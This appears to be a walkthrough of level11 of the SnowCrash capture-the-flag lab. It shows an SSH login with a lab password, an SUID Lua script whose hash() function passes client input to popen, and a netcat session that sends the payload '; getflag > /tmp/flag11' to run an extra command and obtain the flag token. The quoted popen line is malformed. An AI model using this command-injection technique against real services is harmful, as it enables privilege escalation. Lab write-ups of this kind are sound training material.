Login as `level11`.
```shell
┌──$ [~/42/2021/snow-crash]
└─>  ssh 192.168.1.64 -p 4242 -l level11
level11@192.168.1.64's password: feulo4b72j7edeahuete3no7c
```
An `SUID` lua script is located in home directory.
```shell
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```
The script indicates that something running on `localhost:5151`.
```shell
level11@SnowCrash:~$ ./level11.lua
lua: ./level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	./level11.lua:3: in main chunk
	[C]: ?c
```
Verbose port scan for listening daemons, without sending any data to them.

`nc -zv` allows to check connection to `5151` without sending any data and verbose mode.
```shell
level11@SnowCrash:~$ nc -zv localhost 5151
Connection to localhost 5151 port [tcp/pcrd] succeeded!
```

`hash()` function receives input that is received from client.
Then it call `popen` (process open) inserting user input as echo's argument.
```lua
prog = io.popen(echo "..pass.." | sha1sum", "r")
prog = io.popen("echo ; getflag > /tmp/flag11; | sha1sum", "r")
```
Nc into `localhost:5151` and send string `; getflag > /tmp/flag11`
```shell
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: ; getflag > /tmp/flag11
Erf nope..
#level11@SnowCrash:~$ echo "; getflag > /tmp/flag11" | nc 127.0.0.1 5151
level11@SnowCrash:~$ cat /tmp/flag11
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
